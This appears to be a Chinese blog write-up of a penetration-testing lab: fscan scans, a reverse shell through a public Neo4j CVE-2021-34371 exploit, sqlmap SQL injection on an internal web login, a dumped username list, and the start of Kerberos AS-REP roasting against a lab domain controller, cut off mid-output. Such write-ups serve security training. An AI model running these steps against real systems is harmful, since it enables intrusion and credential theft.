          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="fa fa-file-word-o"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>39k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="fa fa-clock-o"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>35 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="FLAG1"><a href="#FLAG1" class="headerlink" title="FLAG1"></a>FLAG1</h1><p>首先用fscan进行信息搜集</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# ../pentest/fscan/fscan2 -h 39.98.117.163 -p 1-65535</span><br><span class="line">┌──────────────────────────────────────────────┐</span><br><span class="line">│    ___                              _        │</span><br><span class="line">│   / _ \     ___  ___ _ __ __ _  ___| | __    │</span><br><span class="line">│  / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /    │</span><br><span class="line">│ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     │</span><br><span class="line">│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │</span><br><span class="line">└──────────────────────────────────────────────┘</span><br><span class="line">      Fscan Version: 2.0.0</span><br><span class="line"></span><br><span class="line">[2025-04-08 12:36:27] [INFO] 暴力破解线程数: 1</span><br><span class="line">[2025-04-08 12:36:27] [INFO] 开始信息扫描</span><br><span class="line">[2025-04-08 12:36:27] [INFO] 最终有效主机数量: 1</span><br><span class="line">[2025-04-08 12:36:27] [INFO] 开始主机扫描</span><br><span class="line">[2025-04-08 12:36:27] [INFO] 有效端口数量: 65535</span><br><span class="line">[2025-04-08 12:36:27] [SUCCESS] 端口开放 39.98.117.163:22</span><br><span class="line">[2025-04-08 12:36:28] [SUCCESS] 服务识别 39.98.117.163:22 =&gt; [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]</span><br><span class="line">[2025-04-08 12:37:17] [SUCCESS] 端口开放 39.98.117.163:1337</span><br><span class="line">[2025-04-08 12:37:27] [SUCCESS] 服务识别 39.98.117.163:1337 =&gt;</span><br><span class="line">[2025-04-08 12:41:00] [SUCCESS] 端口开放 39.98.117.163:7473</span><br><span class="line">[2025-04-08 12:41:01] [SUCCESS] 端口开放 39.98.117.163:7474</span><br><span class="line">[2025-04-08 12:41:08] [SUCCESS] 端口开放 39.98.117.163:7687</span><br><span class="line">[2025-04-08 12:41:11] [SUCCESS] 服务识别 39.98.117.163:7473 =&gt;  Banner:[.P]</span><br><span class="line">[2025-04-08 12:41:11] [SUCCESS] 服务识别 39.98.117.163:7474 =&gt; [http]</span><br><span class="line">[2025-04-08 12:41:18] [SUCCESS] 服务识别 39.98.117.163:7687 =&gt;</span><br></pre></td></tr></table></figure>

<p>fscan扫描靶机，有1337、7473、7474、7687端口，7474端口是neo4j，默认密码neo4j:neo4j(可以登录，但是没什么用)，还有一个CVE-2021-34371，可以直接一把梭哈<a target="_blank" rel="noopener" href="https://github.com/zwjjustdoit/CVE-2021-34371.jar%EF%BC%8C%E5%8F%8D%E5%BC%B9%E4%B8%80%E4%B8%AAshell">https://github.com/zwjjustdoit/CVE-2021-34371.jar，反弹一个shell</a></p>
<p>flag01在neo4j的目录下</p>
<h1 id="FLAG2"><a href="#FLAG2" class="headerlink" title="FLAG2"></a>FLAG2</h1><p>然后上传一个fscan扫描内网（会出来没扫描出来的情况，需要多扫描几次）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">neo4j@ubuntu:~$ ./fscan -h 172.22.6.36/20</span><br><span class="line">./fscan -h 172.22.6.36/20</span><br><span class="line"></span><br><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span><br><span class="line">                     fscan version: 1.8.4</span><br><span class="line">start infoscan</span><br><span class="line">trying RunIcmp2</span><br><span class="line">The current user permissions unable to send icmp packets</span><br><span class="line">start ping</span><br><span class="line">(icmp) Target 172.22.6.25     is alive</span><br><span class="line">(icmp) Target 172.22.6.36     is alive</span><br><span class="line">(icmp) Target 172.22.6.38     is alive</span><br><span class="line"></span><br><span class="line">[*] LiveTop 172.22.0.0/16    段存活数量为: 3</span><br><span class="line">[*] LiveTop 172.22.6.0/24    段存活数量为: 3</span><br><span class="line">[*] Icmp alive hosts len is: 3</span><br><span class="line">172.22.6.36:22 open</span><br><span class="line">172.22.6.25:445 open</span><br><span class="line">172.22.6.25:139 open</span><br><span class="line">172.22.6.25:135 open</span><br><span class="line">172.22.6.38:80 open</span><br><span class="line">172.22.6.38:22 open</span><br><span class="line">172.22.6.36:7687 open</span><br><span class="line">172.22.6.25:445 open</span><br><span class="line">172.22.6.12:445 open</span><br><span class="line">172.22.6.12:139 open</span><br><span class="line">172.22.6.25:139 open</span><br><span class="line">172.22.6.25:135 open</span><br><span class="line">172.22.6.12:135 open</span><br><span class="line">172.22.6.12:88 open</span><br><span class="line"></span><br><span class="line">start vulscan</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.6.25</span><br><span class="line">   [-&gt;]WIN2019</span><br><span class="line">   [-&gt;]172.22.6.25</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.6.12</span><br><span class="line">   [-&gt;]DC-PROGAME</span><br><span class="line">   [-&gt;]172.22.6.12</span><br><span class="line">[*] NetBios 172.22.6.25     XIAORANG\WIN2019              </span><br><span class="line">[*] OsInfo 172.22.6.12  (Windows Server 2016 Datacenter 14393)</span><br><span class="line">[*] NetBios 172.22.6.12     [+] DC:DC-PROGAME.xiaorang.lab       Windows Server 2016 Datacenter 14393</span><br><span class="line">[*]172.22.6.25</span><br><span class="line">   [-&gt;]WIN2019</span><br><span class="line">   [-&gt;]172.22.6.25</span><br><span class="line">[*] NetBios 172.22.6.25     XIAORANG\WIN2019              </span><br><span class="line">[*] WebTitle http://172.22.6.38        code:200 len:1531   title:后台登录</span><br><span class="line">[*] WebTitle https://172.22.6.36:7687  code:400 len:50     title:None</span><br><span class="line">已完成 7/7</span><br><span class="line">[*] 扫描结束,耗时: 1m36.67936002s</span><br></pre></td></tr></table></figure>

<p>172.22.6.38是一个web服务 ，用万能密码可以登录成功存在sql注入，但是不会跳转，用sqlmap跑一下</p>
<p><img src="https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time1.png"></p>
<p>flag02在数据库里，将oa_db.oa_users的email提出，处理一下将用户名提取出来</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# cat 1|grep -E &#x27;\w*@&#x27; -o|grep -E &#x27;[^@]*&#x27; -o &gt;username</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# cat username</span><br><span class="line">mengxiang</span><br><span class="line">mennane</span><br><span class="line">menxilong</span><br><span class="line">menxixiao</span><br><span class="line">miaogui</span><br><span class="line">miaoshu</span><br><span class="line">mingfu</span><br><span class="line">minglian</span><br><span class="line">mingsong</span><br><span class="line">mingyan</span><br><span class="line">moqian</span><br><span class="line">mouchun</span><br><span class="line">moushan</span><br><span class="line">mucheng</span><br><span class="line">muchun</span><br><span class="line">mujie</span><br><span class="line">nangongjun</span><br><span class="line">niuya</span><br><span class="line">nongfan</span><br><span class="line">nongyan</span><br><span class="line">nongyan</span><br><span class="line">nongyao</span><br><span class="line">nongzhen</span><br><span class="line">nongzhu</span><br><span class="line">oulun</span><br><span class="line">panbao</span><br><span class="line">pangcheng</span><br><span class="line">pangning</span><br><span class="line">pangtai</span><br><span class="line">pangzhen</span><br><span class="line">pengyuan</span><br><span class="line">pinghao</span><br><span class="line">puyangfu</span><br><span class="line">qiai</span><br><span class="line">qiangjun</span><br><span class="line">qianqing</span><br><span class="line">qianyi</span><br><span class="line">qianyou</span><br><span class="line">qiaode</span><br><span class="line">qiaomei</span><br><span class="line">qidiaofang</span><br><span class="line">qiguanrou</span><br><span class="line">qijie</span><br><span class="line">qinguan</span><br><span class="line">qiruo</span><br><span class="line">qiyan</span><br><span class="line">qiyong</span><br><span class="line">qiyuan</span><br><span class="line">qiyue</span><br><span class="line">qizhu</span><br><span class="line">qulu</span><br><span class="line">rangsibo</span><br><span class="line">ranqun</span><br><span class="line">rongbiao</span><br><span class="line">rongxianyu</span><br><span class="line">ruanyong</span><br><span class="line">rubao</span><br><span class="line">ruibei</span><br><span class="line">ruilin</span><br><span class="line">ruishi</span><br><span class="line">ruisong</span><br><span class="line">shangjie</span><br><span class="line">shangjun</span><br><span class="line">shangqian</span><br><span class="line">shanshao</span><br><span class="line">shaocai</span><br><span class="line">shaokang</span><br><span class="line">shaoting</span><br><span class="line">shaoyi</span><br><span class="line">shengzhe</span><br><span class="line">shenhang</span><br><span class="line">shenjiao</span><br><span class="line">shenshan</span><br><span class="line">shenshan</span><br><span class="line">shentuyun</span><br><span class="line">sheweiyue</span><br><span class="line">shie</span><br><span class="line">shijian</span><br><span class="line">shijun</span><br><span class="line">shilan</span><br><span class="line">shishu</span><br><span class="line">shouchun</span><br><span class="line">shoujuan</span><br><span class="line">shuangchen</span><br><span class="line">shudi</span><br><span class="line">shuicheng</span><br><span class="line">shuifei</span><br><span class="line">shushi</span><br><span class="line">shuzhen</span><br><span class="line">sisiwu</span><br><span class="line">situxin</span><br><span class="line">siyi</span><br><span class="line">songming</span><br><span class="line">songqin</span><br><span class="line">songyan</span><br><span class="line">sunduangu</span><br><span class="line">sunli</span><br><span class="line">sunmei</span><br><span class="line">sunzhongda</span><br><span class="line">taigongyuan</span><br><span class="line">tanggui</span><br><span class="line">tangqiao</span><br><span class="line">tangrong</span><br><span class="line">tangshun</span><br><span class="line">taoya</span><br><span class="line">tianxin</span><br><span class="line">tongdong</span><br><span class="line">tonghao</span><br><span class="line">tongxue</span><br><span class="line">wangnuo</span><br><span class="line">wangxing</span><br><span class="line">wangyan</span><br><span class="line">wangyan</span><br><span class="line">wangying</span><br><span class="line">wansifei</span><br><span class="line">wansifu</span><br><span class="line">wansishun</span><br><span class="line">wanyan</span><br><span class="line">weicheng</span><br><span class="line">weichipeng</span><br><span class="line">weigong</span><br><span class="line">weihua</span><br><span class="line">weihui</span><br><span class="line">weiliang</span><br><span class="line">weishengshan</span><br><span class="line">weiwan</span><br><span class="line">weixian</span><br><span class="line">weixian</span><br><span class="line">weixue</span><br><span class="line">wenbiao</span><br><span class="line">wenbo</span><br><span class="line">wendong</span><br><span class="line">wengbang</span><br><span class="line">wengong</span><br><span class="line">wenliang</span><br><span class="line">wenshao</span><br><span class="line">wohong</span><br><span class="line">wohua</span><br><span class="line">wuce</span><br><span class="line">wuda</span><br><span class="line">wuhuan</span><br><span class="line">wulun</span><br><span class="line">wunuo</span><br><span class="line">xiahan</span><br><span class="line">xiai</span><br><span class="line">xiamao</span><br><span class="line">xiangdong</span><br><span class="line">xiangjuan</span><br><span class="line">xiangqian</span><br><span class="line">xiangxin</span><br><span class="line">xiangyu</span><br><span class="line">xiaojin</span><br><span class="line">xiaorong</span><br><span class="line">xiayu</span><br><span class="line">xieyi</span><br><span class="line">xijun</span><br><span class="line">ximenshi</span><br><span class="line">xingquan</span><br><span class="line">xingxi</span><br><span class="line">xingye</span><br><span class="line">xionghong</span><br><span class="line">xiqi</span><br><span class="line">xiqidi</span><br><span class="line">xixia</span><br><span class="line">xiyao</span><br><span class="line">xiyi</span><br><span class="line">xuanjiang</span><br><span class="line">xuanlu</span><br><span class="line">xuanqun</span><br><span class="line">xudi</span><br><span class="line">xuehe</span><br><span class="line">xundi</span><br><span class="line">xupeng</span><br><span class="line">xuxin</span><br><span class="line">yangdanhan</span><br><span class="line">yangdanhe</span><br><span class="line">yangju</span><br><span class="line">yanglang</span><br><span class="line">yanguo</span><br><span class="line">yanji</span><br><span class="line">yanjin</span><br><span class="line">yanqian</span><br><span class="line">yanyangmei</span><br><span class="line">yanyue</span><br><span class="line">yanyun</span><br><span class="line">yanzhen</span><br><span class="line">yetai</span><br><span class="line">yexing</span><br><span class="line">yezongyue</span><br><span class="line">yifu</span><br><span class="line">yinbin</span><br><span class="line">yinchen</span><br><span class="line">yingbiao</span><br><span class="line">yingchan</span><br><span class="line">yingjun</span><br><span class="line">yingpeng</span><br><span class="line">yingshi</span><br><span class="line">yinyu</span><br><span class="line">yixue</span><br><span class="line">youchao</span><br><span class="line">youyi</span><br><span class="line">yuanchang</span><br><span class="line">yubo</span><br><span class="line">yufen</span><br><span class="line">yuhui</span><br><span class="line">yuhui</span><br><span class="line">yujian</span><br><span class="line">yujun</span><br><span class="line">yuling</span><br><span class="line">yulvxue</span><br><span class="line">yunhui</span><br><span class="line">yunqian</span><br><span class="line">yunzhong</span><br><span class="line">yurui</span><br><span class="line">yusha</span><br><span class="line">yuwan</span><br><span class="line">yuxi</span><br><span class="line">yuxiao</span><br><span class="line">zangpeng</span><br><span class="line">zangyao</span><br><span class="line">zhangxin</span><br><span class="line">zhangzhao</span><br><span class="line">zhannan</span><br><span class="line">zhaoxiu</span><br><span class="line">zhenglu</span><br><span class="line">zhengpubei</span><br><span class="line">zhengxiao</span><br><span class="line">zhenhui</span><br><span class="line">zhenjun</span><br><span class="line">zhenyan</span><br><span class="line">zhongliying</span><br><span class="line">zhouchun</span><br><span class="line">zhoujing</span><br><span class="line">zhoujun</span><br><span class="line">zhouqi</span><br><span class="line">zhouya</span><br><span class="line">zhouyi</span><br><span class="line">zhuangsong</span><br><span class="line">zhubin</span><br><span class="line">zhufeng</span><br><span class="line">zhuke</span><br><span class="line">zhuli</span><br><span class="line">zhupeng</span><br><span class="line">zhupeng</span><br><span class="line">zhuqin</span><br><span class="line">zhuzhu</span><br><span class="line">zizhuansong</span><br><span class="line">zizhuanyu</span><br><span class="line">zizhuanzhi</span><br><span class="line">zoubao</span><br><span class="line">zoufu</span><br><span class="line">zouqi</span><br><span class="line">zuofen</span><br><span class="line">zuoqiufa</span><br><span class="line">zuoqiutai</span><br><span class="line">zuoshun</span><br></pre></td></tr></table></figure>

<p>然后对域控进行<strong>Kerberos AS-REP Roasting</strong> 攻击</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# impacket-GetNPUsers xiaorang.lab/ -dc-ip 172.22.6.12 -usersfile username -format hashcat</span><br><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies</span><br><span class="line"></span><br><span class="line">/usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).</span><br><span class="line">  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in 